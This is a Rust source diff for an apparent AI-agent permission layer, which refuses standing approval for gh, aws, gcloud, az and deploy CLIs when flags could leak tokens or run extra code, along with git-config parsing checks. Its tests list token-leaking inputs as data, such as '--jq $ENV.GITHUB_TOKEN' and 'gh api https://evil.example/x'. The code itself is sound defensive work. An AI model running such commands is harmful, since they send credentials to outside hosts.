@@ -288,18 +288,31 @@ pub fn command_path(args: &[String]) -> String {
 }
 
 /// What a CLI's arguments can make it do that no pin covers, for the
-/// question's "Only Once is offered: ...".
-struct Refusals {
+/// question's "Only Once is offered: ...". Every program here has Always
+/// only for a run that names a subcommand first, with no flag before it,
+/// so an Always never covers a whole CLI.
+struct Rules {
     stems: &'static [&'static str],
-    /// Flags refused whatever their value.
+    /// Flags refused whatever their value. A one letter flag is refused
+    /// inside a cluster too: `-iq` holds `-q`.
     flags: &'static [&'static str],
+    /// One letter flags refused but under these command paths, where the
+    /// letter means something harmless: gh's `-t` is a title there.
+    flags_but: &'static [(&'static str, &'static [&'static str])],
     /// Flags refused when their value names a file to read.
     file_flags: &'static [&'static str],
+    /// Flags refused when their value names another host.
+    host_flags: &'static [&'static str],
     /// Command paths refused, and every path under them.
     commands: &'static [&'static str],
     /// The top-level commands it has; any other first word may name an
     /// extension, which is code of anyone's.
     known: Option<&'static [&'static str]>,
+    /// Command paths under which an argument holding `://` sends the
+    /// request, and the token, somewhere else.
+    url_commands: &'static [&'static str],
+    /// Reads arguments from `@file`, which the agent can write.
+    response_files: bool,
 }
 
 const GH_COMMANDS: &[&str] = &[
@@ -309,78 +322,148 @@ const GH_COMMANDS: &[&str] = &[
     "run", "search", "secret", "ssh-key", "status", "variable", "version", "workflow",
 ];
 
-const REFUSALS: &[Refusals] = &[
-    Refusals {
+/// Where gh's `-t` is `--title`, not `--template`.
+const GH_TITLES: &[&str] = &["pr create", "pr edit", "issue create", "issue edit", "release create", "release edit"];
+
+const NONE: Rules = Rules {
+    stems: &[],
+    flags: &[],
+    flags_but: &[],
+    file_flags: &[],
+    host_flags: &[],
+    commands: &[],
+    known: None,
+    url_commands: &[],
+    response_files: false,
+};
+
+const RULES: &[Rules] = &[
+    Rules {
         stems: &["gh"],
         // `--jq` and `--template` read the environment: `$ENV.GITHUB_TOKEN`.
-        flags: &["--jq", "-q", "--template", "-t"],
-        file_flags: &[],
-        commands: &["alias", "extension", "ext", "config set"],
+        flags: &["--jq", "-q", "--template", "--hostname"],
+        flags_but: &[("-t", GH_TITLES)],
+        host_flags: &["-R", "--repo"],
+        commands: &["alias", "auth", "extension", "ext", "config set"],
         known: Some(GH_COMMANDS),
+        url_commands: &["api"],
+        ..NONE
     },
-    Refusals {
+    Rules {
         stems: &["aws"],
-        flags: &[],
         file_flags: &["--cli-input-json", "--cli-input-yaml"],
         commands: &["configure"],
-        known: None,
+        ..NONE
     },
-    Refusals {
+    Rules {
         stems: &["gcloud"],
         flags: &["--flags-file"],
-        file_flags: &[],
-        commands: &[],
-        known: None,
+        ..NONE
     },
-    Refusals {
+    Rules {
+        stems: &["az"],
+        response_files: true,
+        ..NONE
+    },
+    Rules {
         stems: &["vercel", "netlify", "wrangler"],
         flags: &["--local-config", "--global-config", "-A", "--config", "-c"],
-        file_flags: &[],
-        commands: &[],
-        known: None,
+        ..NONE
     },
 ];
+
+/// A `-R` value that names a host: `ghe.example/o/r`, `host/o/r`.
+fn names_host(value: &str) -> bool {
+    value.contains("://")
+        || value.split('/').count() >= 3
+        || value.split('/').next().is_some_and(|h| h.contains('.'))
+}
 
 /// Why the arguments leave only Once for the program `stem` names, None
 /// when they do not.
 pub fn always_refused(stem: &str, args: &[String]) -> Option<String> {
     let stem = stem_of(stem);
-    let rules = REFUSALS.iter().find(|r| r.stems.contains(&stem.as_str()))?;
-    let given = |flag: &str, arg: &str| {
-        let short = !flag.starts_with("--");
-        arg == flag
-            || arg.starts_with(&format!("{flag}="))
-            || (short && arg.len() > flag.len() && arg.starts_with(flag))
-    };
-    for (i, arg) in args.iter().enumerate() {
-        if let Some(f) = rules.flags.iter().find(|f| given(f, arg)) {
-            return Some(format!("`{f}` can make {stem} read or run more than its command"));
+    let rules = RULES.iter().find(|r| r.stems.contains(&stem.as_str()))?;
+    if let [only] = args {
+        if matches!(only.as_str(), "--version" | "--help" | "-h") {
+            return None;
         }
-        if let Some(f) = rules.file_flags.iter().find(|f| given(f, arg)) {
-            let value = match arg.split_once('=') {
-                Some((_, v)) => Some(v),
-                None => args.get(i + 1).map(String::as_str),
-            };
-            if value.is_some_and(|v| {
-                let v = v.to_ascii_lowercase();
-                v.starts_with("file://") || v.starts_with("fileb://")
-            }) {
-                return Some(format!("`{f}` reads its input from a file the agent can write"));
-            }
-        }
+    }
+    if args.first().is_some_and(|a| a.starts_with('-')) {
+        return Some(format!(
+            "a flag comes before {stem}'s subcommand, so what it runs is not plain"
+        ));
     }
     let path = command_path(args);
-    if let Some(c) = rules
-        .commands
-        .iter()
-        .find(|c| path == **c || path.starts_with(&format!("{c} ")))
-    {
-        return Some(format!("`{stem} {c}` changes what {stem} runs"));
-    }
     let first = path.split(' ').next().unwrap_or_default();
-    if let Some(known) = rules.known {
-        if !first.is_empty() && !known.contains(&first) {
-            return Some(format!("`{first}` may be an extension, someone else's code"));
+    if first.is_empty() {
+        return Some(format!("it names no {stem} subcommand, and Always would cover all of them"));
+    }
+    if rules.known.is_some_and(|known| !known.contains(&first)) {
+        return Some(format!("`{first}` may be an extension, someone else's code"));
+    }
+    let under = |c: &str| path == c || path.starts_with(&format!("{c} "));
+    if let Some(c) = rules.commands.iter().find(|c| under(c)) {
+        return Some(format!("`{stem} {c}` changes what {stem} runs or where its token goes"));
+    }
+    if rules.url_commands.iter().any(|c| under(c)) && args.iter().any(|a| a.contains("://")) {
+        return Some("it names a full URL, which can send the token to another host".into());
+    }
+    let short_refused = |letter: char| {
+        rules.flags.iter().any(|f| *f == format!("-{letter}"))
+            || rules
+                .flags_but
+                .iter()
+                .any(|(f, but)| *f == format!("-{letter}") && !but.iter().any(|c| under(c)))
+    };
+    let mut i = 0;
+    while i < args.len() {
+        let a = args[i].as_str();
+        let next = args.get(i + 1).map(String::as_str);
+        i += 1;
+        // Everything after `--` is an operand, never a flag.
+        if a == "--" {
+            break;
+        }
+        if rules.response_files && a.starts_with('@') {
+            return Some(format!("`{a}` reads more arguments from a file the agent can write"));
+        }
+        if let Some(long) = a.strip_prefix("--") {
+            let (name, inline) = match long.split_once('=') {
+                Some((n, v)) => (n, Some(v)),
+                None => (long, None),
+            };
+            let flag = format!("--{name}");
+            let value = inline.or(next);
+            if rules.flags.contains(&flag.as_str()) {
+                return Some(format!("`{flag}` can make {stem} read or run more than its command"));
+            }
+            if rules.file_flags.contains(&flag.as_str())
+                && value.is_some_and(|v| {
+                    let v = v.to_ascii_lowercase();
+                    v.starts_with("file://") || v.starts_with("fileb://")
+                })
+            {
+                return Some(format!("`{flag}` reads its input from a file the agent can write"));
+            }
+            if rules.host_flags.contains(&flag.as_str()) && value.is_some_and(names_host) {
+                return Some(format!("`{flag}` names another host, where the token would go"));
+            }
+            continue;
+        }
+        let Some(cluster) = a.strip_prefix('-').filter(|c| !c.is_empty()) else {
+            continue;
+        };
+        if let Some(letter) = cluster.chars().find(|c| short_refused(*c)) {
+            return Some(format!("`-{letter}` can make {stem} read or run more than its command"));
+        }
+        for f in rules.host_flags.iter().filter_map(|f| f.strip_prefix('-').filter(|f| f.len() == 1)) {
+            if let Some((_, rest)) = cluster.split_once(f) {
+                let value = if rest.is_empty() { next } else { Some(rest) };
+                if value.is_some_and(names_host) {
+                    return Some(format!("`-{f}` names another host, where the token would go"));
+                }
+            }
         }
     }
     None
@@ -388,11 +471,14 @@ pub fn always_refused(stem: &str, args: &[String]) -> Option<String> {
 
 /// What a git config file points at that decides what git runs: the
 /// files it includes (`include.path`, `includeIf.*.path`) and the hooks
-/// folder (`core.hooksPath`), as written.
+/// folder (`core.hooksPath`), as written. `odd` is set by anything this
+/// reading and git's could take differently: a `;`, `#` or `\` in a
+/// value outside quotes, or a `\` anywhere in one.
 #[derive(Clone, Debug, Default, PartialEq, Eq)]
 pub struct GitRefs {
     pub includes: Vec<String>,
     pub hooks_path: Option<String>,
+    pub odd: bool,
 }
 
 pub fn git_refs(config: &str) -> GitRefs {
@@ -405,6 +491,7 @@ pub fn git_refs(config: &str) -> GitRefs {
         }
         let line = if let Some(rest) = line.strip_prefix('[') {
             let Some((head, after)) = rest.split_once(']') else {
+                out.odd = true;
                 continue;
             };
             let head = head.trim();
@@ -420,6 +507,15 @@ pub fn git_refs(config: &str) -> GitRefs {
         };
         let key = key.trim().to_ascii_lowercase();
         let value = value.trim();
+        let mut quoted = false;
+        for c in value.chars() {
+            match c {
+                '"' => quoted = !quoted,
+                '\\' => out.odd = true,
+                ';' | '#' if !quoted => out.odd = true,
+                _ => {}
+            }
+        }
         let value = value
             .strip_prefix('"')
             .and_then(|v| v.strip_suffix('"'))
@@ -432,6 +528,20 @@ pub fn git_refs(config: &str) -> GitRefs {
         }
     }
     out
+}
+
+/// `GIT_CONFIG_PARAMETERS` with `pairs` added to what it held, quoted as
+/// git reads it: each `'key=value'`, a `'` inside written `'\''`.
+pub fn git_config_parameters(existing: Option<&str>, pairs: &[(&str, &str)]) -> String {
+    let quote = |s: &str| format!("'{}'", s.replace('\'', r"'\''"));
+    let mut out: Vec<String> = existing
+        .map(str::trim)
+        .filter(|e| !e.is_empty())
+        .map(str::to_string)
+        .into_iter()
+        .collect();
+    out.extend(pairs.iter().map(|(k, v)| quote(&format!("{k}={v}"))));
+    out.join(" ")
 }
 
 /// Whether the program deploys by running the project's own build
@@ -1105,41 +1215,94 @@ mod tests {
     #[test]
     fn arguments_that_reach_past_the_command_leave_only_once() {
         let refused = |stem: &str, line: &str| always_refused(stem, &args(line)).is_some();
-        // gh's output filters read the environment.
+        // gh's output filters read the environment, alone or in a cluster.
         for line in [
             "api user --jq $ENV.GITHUB_TOKEN",
             "api user -q .login",
             "api user -q.login",
+            "api user -iq $ENV.GITHUB_TOKEN",
             "api user --jq=.x",
             "pr list --template {{.}}",
             "pr list -t x",
+            "pr list -wt x",
             "alias set x !sh",
             "extension install a/b",
             "ext list",
             "config set editor x",
+            "auth token",
+            "auth status --show-token",
             "my-extension run",
+            "pr list --hostname ghe.example",
+            "pr list -R ghe.example/o/r",
+            "pr list -Rhost/o/r",
+            "pr list --repo=host/o/r",
+            "pr list --repo ghe.example.com/r",
+            "api https://evil.example/x",
+            "api -X GET -- https://evil.example/x",
         ] {
             assert!(refused("gh.exe", line), "gh {line}");
         }
-        for line in ["pr create --fill", "api repos/a/b", "repo view", "config get editor", "--version", ""] {
+        for line in [
+            "pr create --fill",
+            "pr create -t title",
+            "issue edit 3 -t title",
+            "api repos/a/b",
+            "repo view",
+            "pr list -R o/r",
+            "pr list --repo=o/r",
+            "config get editor",
+            "--version",
+            "--help",
+            // A flag after `--` is an operand.
+            "pr create --fill -- -q",
+        ] {
             assert!(!refused("gh", line), "gh {line}");
+        }
+        // No subcommand, or a flag before it, is never an Always for all of gh.
+        for line in ["", "--repo=o/r pr merge", "-R o/r pr list", "My_Ext", "-- pr list"] {
+            assert!(refused("gh", line), "gh {line}");
         }
         // aws reads its input from a file only with file://.
         assert!(refused("aws", "ec2 run-instances --cli-input-json file://x.json"));
         assert!(refused("aws", "ec2 run-instances --cli-input-yaml=fileb://x"));
         assert!(refused("aws", "configure set x y"));
+        assert!(refused("aws", "--profile work s3 ls"));
         assert!(!refused("aws", "ec2 run-instances --cli-input-json {}"));
         assert!(!refused("aws", "s3 ls --profile work"));
         assert!(refused("gcloud", "run deploy --flags-file=f.yaml"));
         assert!(!refused("gcloud", "run deploy --configuration work"));
+        assert!(refused("az", "vm create @args.txt"));
+        assert!(!refused("az", "login --debug"));
         for stem in ["vercel.cmd", "netlify", "wrangler"] {
-            for line in ["deploy --local-config x", "deploy -A x", "deploy --global-config d", "deploy --config x", "deploy -c x"] {
+            for line in [
+                "deploy --local-config x",
+                "deploy -A x",
+                "deploy --global-config d",
+                "deploy --config x",
+                "deploy -c x",
+                "deploy -yc x",
+                "",
+                "--prod",
+            ] {
                 assert!(refused(stem, line), "{stem} {line}");
             }
             assert!(!refused(stem, "deploy --prod"), "{stem}");
         }
-        assert!(!refused("az", "login --debug"));
+        // A program with no rules of its own is not refused here.
         assert!(!refused("curl", "-t x"));
+        assert!(!refused("stripe", ""));
+    }
+
+    #[test]
+    fn git_reads_extra_settings_as_it_expects_them() {
+        assert_eq!(
+            git_config_parameters(None, &[("core.hooksPath", "C:/h"), ("core.fsmonitor", "false")]),
+            "'core.hooksPath=C:/h' 'core.fsmonitor=false'"
+        );
+        assert_eq!(
+            git_config_parameters(Some(" 'a.b=1' "), &[("x.y", "it's")]),
+            r"'a.b=1' 'x.y=it'\''s'"
+        );
     }
 
     #[test]
@@ -1150,9 +1313,21 @@ mod tests {
             GitRefs {
                 includes: vec!["~/extra.gitconfig".into(), "work.gitconfig".into(), "inline".into()],
                 hooks_path: Some(".githooks".into()),
+                odd: false,
             }
         );
         assert_eq!(git_refs(""), GitRefs::default());
+        // Anything git could read otherwise than this does.
+        for odd in [
+            "[core]\n\thooksPath = a ; b\n",
+            "[core]\n\thooksPath = a # b\n",
+            "[include]\n\tpath = C:\\x\n",
+            "[include]\n\tpath = \"a\\\"b\"\n",
+            "[core\n",
+        ] {
+            assert!(git_refs(odd).odd, "{odd}");
+        }
+        assert!(!git_refs("[alias]\n\tx = \"!echo a;b\"\n").odd, "quoted ; is a value");
     }
 
     const SHIM: &str = "@ECHO off\r\nGOTO start\r\n:find_dp0\r\nSET dp0=%~dp0\r\nEXIT /b\r\n:start\r\nSETLOCAL\r\nCALL :find_dp0\r\n\r\nIF EXIST \"%dp0%\\node.exe\" (\r\n  SET \"_prog=%dp0%\\node.exe\"\r\n) ELSE (\r\n  SET \"_prog=node\"\r\n  SET PATHEXT=%PATHEXT:;.JS;=;%\r\n)\r\n\r\nendLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & \"%_prog%\"  \"%dp0%\\node_modules\\vercel\\dist\\index.js\" %*\r\n";
